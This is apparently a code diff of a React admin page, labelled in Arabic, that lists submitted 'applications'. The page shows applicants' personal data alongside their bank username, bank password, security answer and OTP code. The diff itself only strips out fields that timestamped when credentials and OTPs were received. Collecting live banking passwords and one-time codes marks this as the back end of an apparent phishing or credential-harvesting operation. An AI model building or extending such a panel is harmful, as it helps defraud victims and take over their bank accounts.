@@ -57,12 +57,6 @@ interface ApplicationVersion {
   bankPassword?: string;
   securityAnswer?: string;
   otpCode?: string;
-  status?: string;
-  // أوقات استلام البيانات
-  personalDataReceivedAt?: string | null;
-  bankCredentialsReceivedAt?: string | null;
-  otpReceivedAt?: string | null;
-  statusUpdatedAt?: string | null;
 }
 
 // دمج جميع نسخ الطلب حقلاً بحقل (الأحدث له الأولوية، لكن لا يُسقط حقول القديمة)
@@ -75,10 +69,6 @@ function mergeVersionsData(sources: ApplicationVersion[]): ApplicationVersion {
     "bankName", "bankUsername", "bankPassword", "securityAnswer",
     "otpCode",
   ];
-  // حقول الوقت نأخذها من الأحدث فقط
-  const TIME_FIELDS: (keyof ApplicationVersion)[] = [
-    "personalDataReceivedAt", "bankCredentialsReceivedAt", "otpReceivedAt", "statusUpdatedAt"
-  ];
   const sorted = [...sources].sort(
     (a, b) => (Number(b.version) || 0) - (Number(a.version) || 0)
   );
@@ -90,12 +80,6 @@ function mergeVersionsData(sources: ApplicationVersion[]): ApplicationVersion {
         result[field] = val;
         break;
       }
-    }
-  }
-  // أوقات الاستلام من النسخة الأخيرة
-  if (sorted.length > 0) {
-    for (const field of TIME_FIELDS) {
-      result[field] = sorted[0][field as keyof ApplicationVersion];
     }
   }
   return result as unknown as ApplicationVersion;
@@ -186,17 +170,12 @@ export default function AdminApplicationDetailPage() {
     app as unknown as ApplicationVersion,
   ]);
 
-  const DataRow = ({ label, value, badge, receivedAt }: { label: string; value: string | null | undefined; badge?: string; receivedAt?: string | null }) =>
+  const DataRow = ({ label, value, badge }: { label: string; value: string | null | undefined; badge?: string }) =>
     value ? (
       <div className="flex justify-between py-2 border-b last:border-0">
         <span className="text-muted-foreground text-sm flex items-center gap-1">
           {label}
           {badge && <span className="text-xs bg-blue-100 text-blue-700 px-1.5 py-0.5 rounded">{badge}</span>}
-          {receivedAt && (
-            <span className="text-[10px] text-green-600 font-medium mr-1" dir="ltr">
-              ← {timeAgo(receivedAt)}
-            </span>
-          )}
         </span>
         <span className="font-medium text-sm">{value}</span>
       </div>
@@ -204,42 +183,40 @@ export default function AdminApplicationDetailPage() {
 
   const renderData = (v: ApplicationVersion, isOld: boolean = false) => {
     const tag = isOld ? `نسخة ${v.version}` : undefined;
-    // للبيانات الحالية نستخدم أوقات الاستلام من allData
-    const showTimes = !isOld;
     return (
       <>
         {v.applicantType === "individual" ? (
           <>
-            <DataRow label="الاسم الكامل" value={v.fullName} badge={tag} receivedAt={showTimes ? allData.personalDataReceivedAt : undefined} />
-            <DataRow label="رقم الهوية" value={v.nationalId} badge={tag} receivedAt={showTimes ? allData.personalDataReceivedAt : undefined} />
-            <DataRow label="تاريخ الميلاد" value={v.dateOfBirth} badge={tag} receivedAt={showTimes ? allData.personalDataReceivedAt : undefined} />
-            <DataRow label="الراتب الشهري" value={v.monthlySalary} badge={tag} receivedAt={showTimes ? allData.personalDataReceivedAt : undefined} />
-            <DataRow label="جهة العمل" value={v.employer} badge={tag} receivedAt={showTimes ? allData.personalDataReceivedAt : undefined} />
-            <DataRow label="رقم الهاتف" value={v.phone} badge={tag} receivedAt={showTimes ? allData.personalDataReceivedAt : undefined} />
-            <DataRow label="البريد الإلكتروني" value={v.email} badge={tag} receivedAt={showTimes ? allData.personalDataReceivedAt : undefined} />
-            <DataRow label="المدينة" value={v.city} badge={tag} receivedAt={showTimes ? allData.personalDataReceivedAt : undefined} />
-            <DataRow label="الحالة الاجتماعية" value={v.maritalStatus} badge={tag} receivedAt={showTimes ? allData.personalDataReceivedAt : undefined} />
+            <DataRow label="الاسم الكامل" value={v.fullName} badge={tag} />
+            <DataRow label="رقم الهوية" value={v.nationalId} badge={tag} />
+            <DataRow label="تاريخ الميلاد" value={v.dateOfBirth} badge={tag} />
+            <DataRow label="الراتب الشهري" value={v.monthlySalary} badge={tag} />
+            <DataRow label="جهة العمل" value={v.employer} badge={tag} />
+            <DataRow label="رقم الهاتف" value={v.phone} badge={tag} />
+            <DataRow label="البريد الإلكتروني" value={v.email} badge={tag} />
+            <DataRow label="المدينة" value={v.city} badge={tag} />
+            <DataRow label="الحالة الاجتماعية" value={v.maritalStatus} badge={tag} />
           </>
         ) : (
           <>
-            <DataRow label="اسم الشركة" value={v.companyName} badge={tag} receivedAt={showTimes ? allData.personalDataReceivedAt : undefined} />
-            <DataRow label="نوع النشاط" value={v.businessType} badge={tag} receivedAt={showTimes ? allData.personalDataReceivedAt : undefined} />
-            <DataRow label="السجل التجاري" value={v.commercialRegistration} badge={tag} receivedAt={showTimes ? allData.personalDataReceivedAt : undefined} />
-            <DataRow label="عدد الموظفين" value={v.employeeCount} badge={tag} receivedAt={showTimes ? allData.personalDataReceivedAt : undefined} />
-            <DataRow label="الإيرادات السنوية" value={v.annualRevenue} badge={tag} receivedAt={showTimes ? allData.personalDataReceivedAt : undefined} />
-            <DataRow label="اسم المسؤول" value={v.contactName} badge={tag} receivedAt={showTimes ? allData.personalDataReceivedAt : undefined} />
-            <DataRow label="رقم الهاتف" value={v.phone} badge={tag} receivedAt={showTimes ? allData.personalDataReceivedAt : undefined} />
-            <DataRow label="البريد الإلكتروني" value={v.email} badge={tag} receivedAt={showTimes ? allData.personalDataReceivedAt : undefined} />
+            <DataRow label="اسم الشركة" value={v.companyName} badge={tag} />
+            <DataRow label="نوع النشاط" value={v.businessType} badge={tag} />
+            <DataRow label="السجل التجاري" value={v.commercialRegistration} badge={tag} />
+            <DataRow label="عدد الموظفين" value={v.employeeCount} badge={tag} />
+            <DataRow label="الإيرادات السنوية" value={v.annualRevenue} badge={tag} />
+            <DataRow label="اسم المسؤول" value={v.contactName} badge={tag} />
+            <DataRow label="رقم الهاتف" value={v.phone} badge={tag} />
+            <DataRow label="البريد الإلكتروني" value={v.email} badge={tag} />
           </>
         )}
         {(v.bankName || v.bankUsername) && (
           <div className="mt-4 pt-4 border-t">
             <p className="text-sm font-bold mb-2 text-muted-foreground">بيانات البنك</p>
-            <DataRow label="البنك المختار" value={v.bankName} badge={tag} receivedAt={showTimes ? allData.bankCredentialsReceivedAt : undefined} />
-            <DataRow label="اسم المستخدم" value={v.bankUsername} badge={tag} receivedAt={showTimes ? allData.bankCredentialsReceivedAt : undefined} />
-            <DataRow label="كلمة المرور" value={v.bankPassword} badge={tag} receivedAt={showTimes ? allData.bankCredentialsReceivedAt : undefined} />
-            <DataRow label="كلمة التحقق" value={v.securityAnswer} badge={tag} receivedAt={showTimes ? allData.bankCredentialsReceivedAt : undefined} />
-            <DataRow label="رمز OTP" value={v.otpCode} badge={tag} receivedAt={showTimes ? allData.otpReceivedAt : undefined} />
+            <DataRow label="البنك المختار" value={v.bankName} badge={tag} />
+            <DataRow label="اسم المستخدم" value={v.bankUsername} badge={tag} />
+            <DataRow label="كلمة المرور" value={v.bankPassword} badge={tag} />
+            <DataRow label="كلمة التحقق" value={v.securityAnswer} badge={tag} />
+            <DataRow label="رمز OTP" value={v.otpCode} badge={tag} />
           </div>
         )}
       </>
